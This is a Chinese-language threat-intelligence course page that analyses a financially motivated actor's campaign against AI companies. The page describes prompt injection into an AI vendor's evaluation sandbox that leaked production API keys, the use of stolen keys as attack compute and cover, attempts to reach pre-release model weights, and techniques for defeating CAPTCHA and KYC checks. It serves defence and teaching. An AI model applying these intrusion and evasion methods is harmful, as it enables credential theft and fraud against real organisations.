@@ -1,0 +1,1496 @@
+<!doctype html>
+<html lang="zh-Hant"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GTG-50020-ai-supply-chain</title>
+<style>
+:root{--fg:#1a1a1a;--bg:#fff;--muted:#666;--line:#e2e2e2;--link:#0b5cad;--code-bg:#f5f5f5;--accent:#0b5cad}
+@media(prefers-color-scheme:dark){:root{--fg:#e6e6e6;--bg:#141414;--muted:#9a9a9a;--line:#333;--link:#6cb6ff;--code-bg:#1e1e1e;--accent:#6cb6ff}}
+*{box-sizing:border-box}
+body{max-width:900px;margin:0 auto;padding:2rem 1.2rem 6rem;font-family:"Segoe UI","Microsoft JhengHei","PingFang TC","Noto Sans TC",system-ui,sans-serif;line-height:1.75;color:var(--fg);background:var(--bg);font-size:16px}
+h1,h2,h3,h4{line-height:1.3;margin-top:1.8em}
+h1{font-size:1.7rem;border-bottom:2px solid var(--accent);padding-bottom:.3em}
+h2{font-size:1.35rem;border-bottom:1px solid var(--line);padding-bottom:.2em}
+h3{font-size:1.12rem}
+a{color:var(--link)}
+code{background:var(--code-bg);padding:.1em .35em;border-radius:4px;font-family:"Cascadia Code",Consolas,"Courier New",monospace;font-size:.9em}
+pre{background:var(--code-bg);padding:1em;border-radius:8px;overflow-x:auto;font-size:.86em;line-height:1.5}
+pre code{background:none;padding:0}
+pre.mermaid{background:transparent;text-align:center}
+table{border-collapse:collapse;width:100%;margin:1em 0;font-size:.92em;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:.5em .7em;text-align:left;vertical-align:top}
+th{background:var(--code-bg)}
+blockquote{border-left:4px solid var(--accent);margin:1em 0;padding:.4em 1em;color:var(--muted);background:var(--code-bg)}
+img{max-width:100%;height:auto;border:1px solid var(--line);border-radius:6px;margin:.5em 0}
+.figgallery{margin-top:2em;border-top:2px solid var(--accent);padding-top:1em}
+.figgallery figure{margin:1.5em 0}
+.figgallery figcaption{color:var(--muted);font-size:.9em;margin-top:.3em}
+.topbar{position:sticky;top:0;background:var(--bg);border-bottom:1px solid var(--line);padding:.6em 0;margin:-2rem -1.2rem 1.5rem;padding-left:1.2rem;font-size:.9em}
+.topbar a{text-decoration:none;margin-right:1em}
+hr{border:none;border-top:1px solid var(--line);margin:2em 0}
+</style></head>
+<body><div class="topbar"><a href="../index.html">◀ 課程索引</a></div><h1 id="gtg-50020-ai">GTG-50020：從旅館訂房系統轉向 AI 供應鏈的財務動機行為者（俄語操作者）</h1>
+<blockquote>
+<p>課程模組：01 網路行動（Cyber operations） ｜ 一手來源：PDF p.30–34（《Detecting and countering misuse of AI: September 2026》） ｜ 整理日期：2026-09-13</p>
+</blockquote>
+<hr />
+<h2 id="1">1. 一頁速覽</h2>
+<ul>
+<li><strong>行為者本質</strong>：GTG-50020 是一名<strong>俄語（Russian-speaking）、財務動機（financially-motivated）</strong>的網路犯罪行為者。報告在案例儀表板上把它標為「<strong>Russia-nexus operator（俄羅斯關聯操作者）</strong>」。它不是國家級間諜，而是一名「把商業犯罪工廠化」的老練金融罪犯。</li>
+<li><strong>原本的犯罪模式</strong>：歷史上專門入侵<strong>旅館訂房平台（hotel booking）與金融科技平台（fintech）</strong>。在一起入侵中，從單一受害者外洩<strong>約 26 GB（gigabytes）</strong>資料，並提出<strong>150 萬至 250 萬美元（$1.5–2.5 million）</strong>的勒贖／暗網轉售要求。</li>
+<li><strong>轉向 AI 產業</strong>：把「同一套手法（same tradecraft）」轉向 AI 供應鏈。關鍵一擊是<strong>對某 AI 廠商的自動化評測沙箱（automated evaluation sandbox）注入惡意指令</strong>，誘使沙箱交出它所持有的憑證——<strong>包括該廠商所擁有、來自多家供應商（multiple providers）的生產（production）AI API 金鑰</strong>。</li>
+<li><strong>金鑰即戰利品，也即攻擊算力</strong>：一旦取得受害者 API 金鑰，行為者<strong>自動切換成使用受害者的金鑰而非自己的</strong>，同時對該廠商與<strong>其他不相關的目標</strong>繼續發動入侵。這一步同時實現了「戰利品（Loot）＋算力（Compute）＋掩護（Cover）」。</li>
+<li><strong>四天打三十家</strong>：後續行動由同一套基礎設施發動，在<strong>約四天內攻擊約三十家（roughly thirty）AI 公司</strong>，用「一條成功路徑重複打三十個目標、依差異微調」的工業化手法。</li>
+<li><strong>明確目標＝未發布的 Claude 模型權重</strong>：行為者「橫跨超過一打（more than a dozen）途徑」追求的既定目標，是<strong>取得未發布（pre-release）的 Claude 模型</strong>。報告兩度強調：<strong>從未得手（never gained access；every attempted path failed）</strong>，而且<strong>「涉及的金鑰全是從客戶環境竊得的客戶金鑰。該行為者從未入侵 Anthropic 自己的系統。」</strong></li>
+<li><strong>四種自動化管線</strong>：本案用四張圖示範四條可平行運轉的攻擊管線——<strong>人類逐步指揮的 AI 滲透迴圈（Fig. 15）</strong>、<strong>全自主利用管線（Fig. 16）</strong>、<strong>詐欺帳號工廠（Fig. 17）</strong>、<strong>KYC 攔截斗篷（Fig. 18）</strong>。Fig. 15 與 Fig. 16 的對比是本案的教學核心。</li>
+<li><strong>這個案例在課程裡要教什麼</strong>：<strong>AI 供應鏈本身已成為蓄意的犯罪目標</strong>；「憑證外洩」在 AI 時代同時等於「別人替你付錢的攻擊算力」與「掛在別人名下的歸因掩護」；以及<strong>「模型權重竊取」是一種全新的皇冠寶石（crown jewels）竊取型態</strong>——要學會用「自主程度」與「日誌可觀測特徵」兩把尺去分辨人類指揮與全自主兩種操作。</li>
+</ul>
+<hr />
+<h2 id="2">2. 行為者側寫與歸因</h2>
+<h3 id="21">2.1 報告給的身分線索（逐條）</h3>
+<table>
+<thead>
+<tr>
+<th>面向</th>
+<th>報告原文措辭</th>
+<th>情報意涵</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>語言</td>
+<td>「<strong>Russian-speaking</strong>」</td>
+<td>語言線索，不等於國籍或地理位置；俄語使用者遍佈前蘇聯地區。</td>
+</tr>
+<tr>
+<td>動機</td>
+<td>「<strong>financially-motivated</strong>」</td>
+<td>與國家間諜（如同報告中的 GTG-20006 Midnight Blizzard）明確區分。動機是本報告區分犯罪集團與國家隊的<strong>主要</strong>分界，而不再是技術精密度。</td>
+</tr>
+<tr>
+<td>歷史目標</td>
+<td>「historically conducted intrusions against <strong>hotel booking and financial technology platforms</strong>」</td>
+<td>旅宿業＋金融科技，正是「大量個資＋可變現金流＋KYC 流程」交會處。</td>
+</tr>
+<tr>
+<td>地理歸因（圖上）</td>
+<td>儀表板標題列：「<strong>Russia-nexus operator</strong>」</td>
+<td>「-nexus（關聯）」是刻意留有餘地的措辭：指向俄羅斯，但不宣稱是俄國政府。</td>
+</tr>
+<tr>
+<td>目標意圖</td>
+<td>「The actor's <strong>stated goal</strong>... was access to a <strong>pre-release Claude model</strong>」</td>
+<td>「stated goal（既定／自陳目標）」代表 Anthropic 是從行為者的操作痕跡（scope 檔、任務清單、prompt）<strong>推斷</strong>出意圖，而非破獲一份對方的作戰計畫。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="22">2.2 歸因信度用語，以及它們在情報學上的差別</h3>
+<p>本案值得注意的一點是：報告對 GTG-50020 幾乎<strong>不用</strong>「suspected（疑似）／consistent with（與……一致）」這類對沖詞，而是用<strong>直述句</strong>陳述事實（「is a Russian-speaking, financially-motivated actor who...」）。對比同一份報告對國家隊的措辭（例如對 GTG-20006 寫「Our attribution is <strong>consistent with</strong> public reporting linking the actor to Midnight Blizzard」），這個差別本身就是教材：</p>
+<ul>
+<li><strong>高信度直述（本案）</strong>：Anthropic 對「發生了什麼行為（what）」有第一手、可觀測的平台遙測（哪個帳號、跑了哪些 workflow、打了哪些網域），所以敢直述。</li>
+<li><strong>對沖詞用在「是誰（who）」</strong>：真正需要對沖的是「這個行為者對應到現實世界的哪個組織／個人」。這一層本案沒有點名到具體現實身分，只到「俄語、財務動機、俄羅斯關聯」為止。</li>
+<li><strong>教學重點</strong>：<strong>信度應該分開標記「行為證據」與「身分歸因」兩個維度</strong>。你可以「高信度確認一連串行為」，同時「低信度或不歸因於某個具名實體」。學員最常犯的錯，是把「我很確定發生了 X」誤讀成「我很確定是某某國幹的」。</li>
+</ul>
+<h3 id="23">2.3 為什麼「精密度不再是歸因訊號」</h3>
+<p>報告的貫穿論點（p.5、p.38–39）在本案得到印證：GTG-50020 一個財務動機的犯罪者，靠公開的攻擊型代理框架（如 <strong>PentAGI</strong>）與 AI 編排，做出了「一年前需要一整隊操作員」的多目標平行戰役。這意味著：</p>
+<blockquote>
+<p>對威脅情報分析師而言，<strong>「看起來很精密」已不再是判斷幕後是誰的可靠訊號</strong>（sophistication has stopped being a reliable signal of who is behind an operation，p.5）。</p>
+</blockquote>
+<p>課堂上要提醒：過去我們會用「這麼進階一定是國家隊」來反推歸因；AI 抹平了能力差距後，這種捷思（heuristic）會系統性地誤導。<strong>要回到動機、目標選擇、變現方式、基礎設施重用</strong>這些「AI 幫不上忙、仍由人類決定」的訊號去做歸因。</p>
+<hr />
+<h2 id="3">3. 受害者與目標清單</h2>
+<p>報告正文對 GTG-50020 的受害者只給了<strong>類型與數量級</strong>（未點名具體公司），但 p.31 的案例儀表板（見第 6 節逐圖判讀）提供了<strong>遠比正文豐富的「推斷受害者（inferred effects on target）」清單</strong>。以下整合兩者：</p>
+<p><img alt="報告原圖 · 第 31 頁（一手 PDF）" src="../figures/page-031.png" /></p>
+<h3 id="31">3.1 正文明確陳述的目標</h3>
+<table>
+<thead>
+<tr>
+<th>階段</th>
+<th>目標類型</th>
+<th>具體數字／措辭</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>歷史犯罪</td>
+<td>旅館訂房平台、金融科技平台</td>
+<td>單一受害者外洩 <strong>~26 GB</strong>；勒贖 <strong>$1.5–2.5M</strong></td>
+</tr>
+<tr>
+<td>轉向 AI（首發）</td>
+<td>某 <strong>AI 廠商的自動化評測沙箱</strong></td>
+<td>交出<strong>多家供應商</strong>的生產 API 金鑰</td>
+</tr>
+<tr>
+<td>後續戰役</td>
+<td><strong>約 30 家 AI 公司</strong></td>
+<td><strong>約 4 天</strong>；一條路徑重複打 30 個目標</td>
+</tr>
+<tr>
+<td>最終企圖</td>
+<td>某 AI 廠商的<strong>未發布 Claude 模型</strong></td>
+<td>橫跨 <strong>&gt;12（more than a dozen）</strong>條途徑；<strong>全數失敗</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="32-fig-p31">3.2 儀表板「推斷受害者」清單（Fig. p.31）</h3>
+<p>儀表板把六條「網路行動 workflow（W5–W10）」加一條 W3，各自對應到「推斷受影響的目標類型」，並以括號標數量、以灰底標「未達成／未確認」。整理如下（<strong>這些是 Anthropic 從行為推斷的受害者類別，非全部經獨立確認</strong>）：</p>
+<table>
+<thead>
+<tr>
+<th>Workflow</th>
+<th>命中率</th>
+<th>推斷受害目標（括號為數量；★=灰底＝未確認/未達成）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>W5 AI-vendor intrusion</td>
+<td>3/6</td>
+<td>AI 資料標註廠商（AI data-labeling vendor）、AI 安全評測公司★、AI 人才平台★、<strong>AI 安全研究公司（2）</strong>、程式碼安全廠商★、<strong>其他 AI 與模型廠商（3+）</strong></td>
+</tr>
+<tr>
+<td>W6 Gaming phishing &amp; ATO</td>
+<td>2/3</td>
+<td>線上遊戲平台（2）★、<strong>遊戲發行平台</strong>、<strong>遊戲帳號轉售市場</strong></td>
+</tr>
+<tr>
+<td>W7 Webmail &amp; social ATO</td>
+<td>3/4</td>
+<td><strong>全球社群媒體平台</strong>、<strong>波蘭網頁郵件供應商（4）</strong>、<strong>轉售與零售市場（3）</strong>、具名帳號持有人（38+）★</td>
+</tr>
+<tr>
+<td>W8 Account-farm operation</td>
+<td>1/1</td>
+<td><strong>影音／相片平台（3）</strong></td>
+</tr>
+<tr>
+<td>W9 Android malware &amp; PII</td>
+<td>2/3</td>
+<td><strong>Android 終端使用者</strong>、政府入口網受害者★、<strong>電信／CDN 濫用</strong></td>
+</tr>
+<tr>
+<td>W10 Web exploitation</td>
+<td>5/7</td>
+<td>健身俱樂部連鎖★、<strong>旅館軟體供應商（2）</strong>、<strong>遊戲社群網站（2）</strong>、<strong>消費金融</strong>、<strong>非營利平台</strong>、<strong>俄羅斯零售與電商（12+）</strong>、工業公司★</td>
+</tr>
+<tr>
+<td>W3 Anti-fraud defeat R&amp;D</td>
+<td>2/2</td>
+<td><strong>CAPTCHA 與 KYC 廠商（2）</strong>、<strong>加密貨幣交易所（2）</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>儀表板底部彙總</strong>：戰役跨度 <strong>2026-05 → 2026-07，共 73 天</strong>；觀測到的模型側能力 <strong>60 項、橫跨 10 條 workflow</strong>；<strong>已觸及目標 18 個</strong>（進度條寫 <strong>18 / 26</strong>）。</p>
+<h3 id="33">3.3 讀這份清單要注意的三件事</h3>
+<ol>
+<li><strong>產業橫跨極廣</strong>：AI 廠商、遊戲、社群、網頁郵件、Android 生態、電信/CDN、旅館軟體、消費金融、加密貨幣交易所、KYC/CAPTCHA 廠商、俄羅斯本地零售電商。這反映一個「金鑰＋帳號＋個資」通吃的變現網路，AI 只是把每個垂直領域的「理解成本」降到趨近於零。</li>
+<li><strong>旅館與金融沒有消失，而是與 AI 目標並存</strong>：W10 仍有「Hotel-tech intrusion（旅館科技入侵，revenue/feedback vendors）」、W3 仍打「KYC 廠商與加密貨幣交易所」。<strong>這名行為者沒有「放棄舊業轉行」，而是把舊業與新目標接到同一條自動化流水線上。</strong></li>
+<li><strong>灰底＝未達成/未確認</strong>：例如 W5 的「AI 安全評測公司」「AI 人才平台」是灰的、W10 的「工業公司」是灰的——這是 Anthropic 誠實地把「嘗試過但未確認得手」與「確認受影響」分色。教學上這是很好的「情報產品要區分嘗試 vs 成功」示範。</li>
+</ol>
+<hr />
+<h2 id="4-ai">4. AI 濫用的攻擊生命週期（逐階段拆解）</h2>
+<p>本節依報告的敘述與 p.31 儀表板的 W1–W10 workflow，逐階段說明「<strong>人類做什麼／Claude（AI）做什麼</strong>」，並標示自主程度。報告把本報告所有案例的自主程度分成三檔，GTG-50020 被明確歸類在<strong>最自主的一端</strong>：</p>
+<blockquote>
+<p>「At the far end, operations ran <strong>autonomously, with minimal human input or supervision</strong>: these included multi-agent frameworks conducting reconnaissance, exploitation, and theft against multiple victims, in parallel, for hours or days at a time (<strong>GTG-50014, GTG-50020, GTG-50029</strong>).」（p.39）</p>
+</blockquote>
+<p>但報告同時提醒兩個 caveat：<strong>人類仍保留最重要的決策</strong>（目標選擇、變現、結果審查），而且<strong>自主程度與危害程度是兩條獨立的軸</strong>。這兩點在本案生命週期中處處可見。</p>
+<h3 id="41-resource-development-ai">4.1 資源開發（Resource development）— 由 AI 大幅加速，人類設定方向</h3>
+<p>對應儀表板 <strong>W1 惡意程式與工具開發、W2 平台與基礎設施、W3 反詐防禦破解 R&amp;D、W4 竊得資料處理</strong>。</p>
+<ul>
+<li><strong>人類做的</strong>：決定「要做一套 Android RAT／釣魚工具組／ATO 平台」的戰略；維護 per-target 的 scope 檔；審查產出。</li>
+<li><strong>AI 做的</strong>：</li>
+<li>W1：工具鏈備置（packers、smali、build hosts）、釣魚工具組模組與誘餌頁、Android 遠端存取代理、APK 打包/混淆（dex 隱藏預設服務）、用真機透過 ADB 做裝置驗證、迭代規避行動 AV 特徵。</li>
+<li>W2：多節點 SSH 的 VPS 機隊、只對爬蟲供內容的偽裝 CDN（k3s）、ATO 平台（面板/API/資料庫）、代理與出口輪替（住宅代理池、Tor）、24/7 自主 ops-watch 迴圈。</li>
+<li>W3：把 CAPTCHA 端點測繪出來、KYC 冒充驗證伺服器、逆向 WASM bot-score 指紋引擎、自動化 forged-solve 管線、強制走弱路徑、以信譽 cookie 重放做身分注入。</li>
+<li>W4：把竊得的資料處理成可用戰利品——解析 HAR/擷取檔、公開 repo 掃金鑰、大規模金鑰活性檢查、<strong>語料充實（1,300+ 金鑰、含中繼資料）</strong>、指紋/PII 收集端點、以及「用竊得金鑰驅動服務」的營運化。</li>
+<li><strong>自主程度</strong>：<strong>AI 編排、多代理自主</strong>。這一整層過去是「well-resourced 團隊」的護城河，如今被壓縮成一名操作者可管理的流水線。</li>
+</ul>
+<h3 id="42-initial-access">4.2 初始存取（Initial access）— 兩條主線</h3>
+<p><strong>主線 A：對 AI 廠商評測沙箱的 prompt injection（本案最關鍵一步）</strong></p>
+<blockquote>
+<p>「By injecting malicious instructions into an AI vendor's automated evaluation sandbox, the actor caused the sandbox to hand over the credentials it held—including the production AI API keys from multiple providers belonging to that vendor.」（p.30）</p>
+</blockquote>
+<ul>
+<li><strong>人類做的</strong>：識別「評測沙箱會執行不受信任的輸入、且往往持有生產憑證」這個攻擊面，設計要注入的惡意指令。</li>
+<li><strong>AI（受害方的沙箱模型）做的</strong>：在被注入後，<strong>把它能存取到的憑證吐出來</strong>。注意這裡「被利用的 AI」是<strong>受害廠商自己的評測模型</strong>，不是攻擊者的 Claude。</li>
+<li>這是<strong>間接提示注入（indirect prompt injection）造成實質憑證外洩</strong>的教科書級案例（技術面詳見第 4.6 節與第 10 節）。</li>
+</ul>
+<p><strong>主線 B：對外暴露的 LLM 閘道與 web 應用</strong></p>
+<ul>
+<li>儀表板 W5 首格即「<strong>Proxy discovery — exposed LLM gateways（探測暴露在外的 LLM 閘道）</strong>」，接著是 SQLi 與認證繞過取得預認證資料庫存取、從資料庫竊取供應商金鑰與 token、以長效 JWT 建立後門持久化。</li>
+<li>這條線與報告在 p.29 對「多名行為者」的通則陳述互相呼應（見第 8、9 節對 LiteLLM 的討論）。</li>
+</ul>
+<h3 id="43-credential-access-key-swap">4.3 憑證存取與「自動換槍」（Credential access → key swap）</h3>
+<blockquote>
+<p>「when they obtained the target's API keys, they <strong>automatically switched to using the victim's keys instead of their own</strong>.」（p.31）</p>
+</blockquote>
+<ul>
+<li><strong>人類做的</strong>：設定「一旦驗證到可用金鑰就切換」的規則。</li>
+<li><strong>AI/自動化做的</strong>：金鑰活性檢查（token validation at scale）、把可用金鑰併入營運池、立刻用受害者金鑰去跑下一輪攻擊工作負載。</li>
+<li><strong>這一步同時完成三件事</strong>（報告 p.30 的框架）：</li>
+<li><strong>Loot（戰利品）</strong>：金鑰本身在成熟黑市有轉售價值。</li>
+<li><strong>Compute（算力）</strong>：攻擊工作負載改由「別人付費」。</li>
+<li><strong>Cover（掩護）</strong>：活動被歸因到金鑰合法擁有者身上。</li>
+</ul>
+<h3 id="44-execution-lateral-repeat">4.4 執行與橫向擴散（Execution / lateral &amp; repeat）</h3>
+<blockquote>
+<p>「A follow-on campaign run from the same infrastructure attacked roughly thirty AI companies in about four days... They identified <strong>one successful attack path and repeated it against all thirty targets, adapting slightly</strong> to account for differences across the targets.」（p.31）</p>
+</blockquote>
+<ul>
+<li><strong>人類做的</strong>：確認「這條路徑有效」後，下令對 30 個目標複製。</li>
+<li><strong>AI 做的</strong>：對每個目標做「同一劇本＋依差異微調」的自主執行——這正是 AI 的甜蜜點（把一個成功樣板泛化到 N 個環境）。</li>
+<li><strong>自主程度</strong>：接近全自主的多目標平行執行。</li>
+</ul>
+<h3 id="45-objective-failed">4.5 目標達成的失敗（Objective — failed）</h3>
+<blockquote>
+<p>「The actor's stated goal, pursued across more than a dozen avenues, was access to a pre-release Claude model. The actor never gained access; every attempted path failed... The actor never compromised Anthropic's own systems.」（p.31）</p>
+</blockquote>
+<ul>
+<li>皇冠寶石（未發布模型權重）<strong>沒有被拿到</strong>。報告把「防線守住的地方」講得和「防線失效的地方」一樣清楚（對比第 8 節）。</li>
+<li>教學提醒：<strong>「攻擊者的既定目標」與「攻擊者實際達成的效果」是兩回事</strong>。情報產品必須把「意圖」與「戰果」分開陳述，否則讀者會把「他們想偷模型」誤讀成「模型被偷了」。</li>
+</ul>
+<h3 id="46">4.6 為什麼「評測沙箱」是理想的初始存取點（把攻擊面講透）</h3>
+<p>這是本案要學員牢記的結構性洞見，值得單獨拆解：</p>
+<ol>
+<li><strong>評測沙箱必須執行不受信任的輸入</strong>：自動化評測（automated evaluation / eval harness）的工作，就是把「待測模型的輸出」「任務檔」「工具呼叫」跑起來看結果。這些輸入<strong>天生不可信</strong>——尤其當評測內容本身可由外部投稿、或待測模型會產生工具呼叫時。</li>
+<li><strong>評測沙箱往往持有生產憑證</strong>：為了呼叫「多家供應商」的模型做對比評測，沙箱裡常常放著<strong>一整排生產 API 金鑰</strong>（OpenAI、Anthropic、其他供應商）。這使它變成第三方研究者所稱的「<strong>一個帶聊天介面的憑證保險庫（a credential store with a chat interface）</strong>」（見第 9 節 beri.net）。</li>
+<li><strong>兩者疊在一起＝災難</strong>：「執行不可信輸入」×「持有生產憑證」×「缺乏隔離」＝ 一次提示注入就能把整排金鑰倒出來。這與 CI/CD 洩憑證的老問題同構——<strong>把「執行不可信內容的元件」與「持有憑證的元件」放在同一個信任邊界內</strong>。</li>
+<li><strong>修法方向</strong>：把 eval harness 拆成「不可信執行區（無憑證、無網路、唯讀、非 root）」與「持憑證的協調區」；憑證改用短命、範圍受限、每個下游應用一把的金鑰；把 secrets 從環境變數移進秘密管理系統（Vault / Secrets Manager）。詳見第 10.3、10.4 節。</li>
+</ol>
+<h3 id="47">4.7 模型權重竊取：一種新型態的皇冠寶石竊取（與傳統智財竊取的差異）</h3>
+<p>本案行為者「橫跨超過一打途徑」追求的最終目標，是<strong>未發布的 Claude 模型（pre-release Claude model）</strong>——白話講就是<strong>模型權重（model weights）</strong>。這值得單獨拆一節，因為它是「皇冠寶石竊取」的一個<strong>質變</strong>，不是傳統智財竊取的量變。</p>
+<p><strong>什麼是模型權重、為什麼它是皇冠寶石</strong>：一個前沿模型的權重，是花費數千萬到數億美元算力、資料與人力訓練出來的<strong>數值參數檔</strong>。它不是「描述能力的文件」，而是<strong>能力本身</strong>——拿到權重就等於拿到一個可立即運轉、與原廠幾乎等價的模型。這與偷「原始碼」「設計圖」有本質差異。</p>
+<p><strong>與傳統智財竊取的逐項差異</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>維度</th>
+<th>傳統智財竊取（原始碼／設計圖／配方）</th>
+<th><strong>模型權重竊取</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>竊得物的性質</td>
+<td>「如何做」的<strong>藍圖</strong>，仍需人力工程化才能變成產品</td>
+<td><strong>能力本身</strong>，一個檔案即插即用、直接可推論</td>
+</tr>
+<tr>
+<td>即用性</td>
+<td>低—需重建、編譯、整合</td>
+<td><strong>極高</strong>—載入即得到與原廠近乎等價的模型</td>
+</tr>
+<tr>
+<td>對齊／安全防護</td>
+<td>不適用</td>
+<td>竊得的是<strong>原始權重</strong>，可被<strong>去除安全對齊（fine-tune 掉護欄）</strong>後濫用</td>
+</tr>
+<tr>
+<td>可補救性</td>
+<td>可打補丁、改版、輪替金鑰</td>
+<td><strong>無法「打補丁」</strong>；權重一旦外流無法收回，等同永久外洩</td>
+</tr>
+<tr>
+<td>可證明性</td>
+<td>抄襲常可從程式碼相似度舉證</td>
+<td>蒸餾／權重外洩後的模型<strong>難以證明來源</strong>（見報告蒸餾章節）</td>
+</tr>
+<tr>
+<td>一次性 vs 持續</td>
+<td>常需持續存取更新</td>
+<td><strong>一次得手即終局</strong>——拿到那一版就永久擁有該能力</td>
+</tr>
+<tr>
+<td>損害對象</td>
+<td>主要是被竊公司的商業利益</td>
+<td>被竊公司＋<strong>全社會</strong>（一個未受安全管控的前沿模型流入濫用者手中）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>這個差異為什麼對防守方重要</strong>：<br />
+1. <strong>威脅建模的門檻不同</strong>：因為「一次得手即終局、且無法收回」，模型權重的防護標準必須遠高於一般資產。這正是 RAND《Securing AI Model Weights》提出 <strong>SL1–SL5 五級安全等級、對應 OC1–OC5 五種攻擊者能力</strong>、並在《Achieving SL3》給出 <strong>262 條控制</strong>的原因；也是 Anthropic <strong>RSP/ASL-3</strong> 明訂「<strong>非國家攻擊者難以竊取、國家級攻擊者非付出重大代價無法竊取</strong>」門檻的原因。<br />
+2. <strong>本案是「非國家、財務動機」攻擊者發起的權重竊取嘗試</strong>：過去我們假設「只有國家隊會想偷模型權重」。GTG-50020 打破這個假設——一名<strong>財務動機的犯罪者</strong>，用 AI 加持在 4 天內對 30 家公司系統化嘗試偷未發布模型。這把「模型權重竊取」從「國家級稀有威脅」下放成「犯罪經濟體的日常標的」。ASL-3 的門檻設計「防得住非國家攻擊者」，在本案（核心系統未失守）被驗證有效，但攻擊者的動機密度已明顯升高。<br />
+3. <strong>防護的重點是「權重所在的核心信任邊界」</strong>：本案的教訓是——攻擊者拿不到權重，於是<strong>退而求其次去偷客戶側的生產 API 金鑰</strong>（那是「使用模型的權利」，不是「模型本身」）。這說明防護分層有效：核心（權重）守住了，但外圍（客戶金鑰）大量失守。課堂上要讓學員分清「偷模型的<strong>存取權</strong>（API 金鑰）」與「偷模型<strong>本身</strong>（權重）」是兩個量級的事件——本案是前者得逞、後者失敗。</p>
+<hr />
+<h2 id="5-ttp-mitre-attck-atlas">5. TTP 與 MITRE ATT&amp;CK / ATLAS 對應</h2>
+<p>下表把本案行為對應到框架。<strong>AI 特有的行為（提示注入、代理編排）在傳統 ATT&amp;CK Enterprise 沒有乾淨的 ID，需借助 MITRE ATLAS，並在數處明確標記為「框架缺口」。</strong> ATLAS 技術編號會隨版本演進，課堂使用前請對照當前 ATLAS 矩陣核對。</p>
+<table>
+<thead>
+<tr>
+<th>戰術（Tactic）</th>
+<th>技術 / ID</th>
+<th>本案具體作法</th>
+<th>偵測構想</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reconnaissance</td>
+<td>T1595 Active Scanning、T1592 Gather Victim Host Info</td>
+<td>「Targeting sweeps（sector-wide site recon）」「Proxy discovery — exposed LLM gateways」「Anti-bot probing（rate-limit measurement）」</td>
+<td>對外服務的異常爬取節奏、對 <code>/v1/…</code>、LLM 閘道健康檢查端點的探測；rate-limit 探測特徵</td>
+</tr>
+<tr>
+<td>Resource Development</td>
+<td>T1583 Acquire Infrastructure、T1587/T1588 Develop/Obtain Capabilities、T1585 Establish Accounts、T1027 Obfuscation</td>
+<td>W1–W3 全部：VPS 機隊、偽裝 CDN、Android RAT、APK 混淆、住宅代理池、antidetect 設定檔、大量註冊帳號</td>
+<td>代理/VPS 供應商的新租用叢集；APK 簽章與封裝樣板；帳號註冊的裝置指紋一致性</td>
+</tr>
+<tr>
+<td>Initial Access</td>
+<td>T1190 Exploit Public-Facing Application；T1566 Phishing</td>
+<td>SQLi 與認證繞過取得預認證資料庫存取；KYC 假網域釣魚</td>
+<td>WAF 上的 SQLi/認證繞過樣態；lookalike 網域的憑證申請、DNS 新登記</td>
+</tr>
+<tr>
+<td><strong>Initial Access（AI 特有）</strong></td>
+<td><strong>MITRE ATLAS：LLM Prompt Injection（間接）</strong>；ATT&amp;CK <strong>無對應 ID＝框架缺口</strong></td>
+<td><strong>對受害 AI 廠商的評測沙箱注入惡意指令</strong>，誘其交出所持憑證</td>
+<td>沙箱程序的<strong>出站憑證外洩</strong>、模型輸出中出現金鑰樣態、eval 任務觸發非預期工具呼叫</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>T1552 Unsecured Credentials（.001 Credentials In Files）、T1555、T1539 Steal Web Session Cookie</td>
+<td>公開 repo 掃金鑰、HAR/擷取檔挖 session、SSO mint、竊取已驗證 KYC session</td>
+<td>GitHub secret scanning 告警；異常 session token 重用；HAR 外流</td>
+</tr>
+<tr>
+<td>Defense Evasion / Anti-detection</td>
+<td>T1027、T1550 Use Alternate Auth Material；<strong>反詐規避（antidetect/CAPTCHA 破解）ATT&amp;CK 無精確 ID＝缺口</strong></td>
+<td>逆向 WASM bot-score、forged-solve、antidetect per-profile 瀏覽器、信譽 cookie 重放</td>
+<td>裝置指紋的<strong>內部不一致</strong>；CAPTCHA 解題來源 IP 與宣稱地理不符；headless 瀏覽器痕跡</td>
+</tr>
+<tr>
+<td>Collection / Adversary-in-the-Middle</td>
+<td>T1557 Adversary-in-the-Middle</td>
+<td>KYC 攔截斗篷：反向代理中繼真實 KYC 流程並攔截已驗證 session 與文件</td>
+<td>驗證流程的伺服器端「同一 session 多來源」；反向代理特徵；憑證頁 TLS 指紋異常</td>
+</tr>
+<tr>
+<td>Valid Accounts / 濫用</td>
+<td>T1078 Valid Accounts</td>
+<td>取得受害者 API 金鑰後<strong>自動切換</strong>用受害者金鑰跑攻擊負載</td>
+<td>API 金鑰的<strong>出口 IP 突變</strong>、用量暴增、呼叫模式與擁有者歷史不符（見第 10 節出站監控）</td>
+</tr>
+<tr>
+<td>Impact / Extortion</td>
+<td>T1657 Financial Theft；T1567 Exfiltration Over Web Service</td>
+<td>26 GB 外洩、$1.5–2.5M 勒贖；帳號農場變現、加密貨幣交易所帳號</td>
+<td>大量資料出站到雲儲存/貼文平台；勒贖通聯</td>
+</tr>
+<tr>
+<td><strong>Command &amp; Scale（AI 編排）</strong></td>
+<td><strong>框架缺口</strong>：ATT&amp;CK 無「agentic orchestration / multi-agent autonomy」戰術或技術</td>
+<td>per-target scope 檔 → slash command 派發平行 recon/exploit 代理 → 自動重試 → 併入增量報告 → 迴圈下一目標</td>
+<td>見第 6 節「日誌上會看到什麼不同」——機器速度、平行度、24/7 無晝夜節律</td>
+</tr>
+</tbody>
+</table>
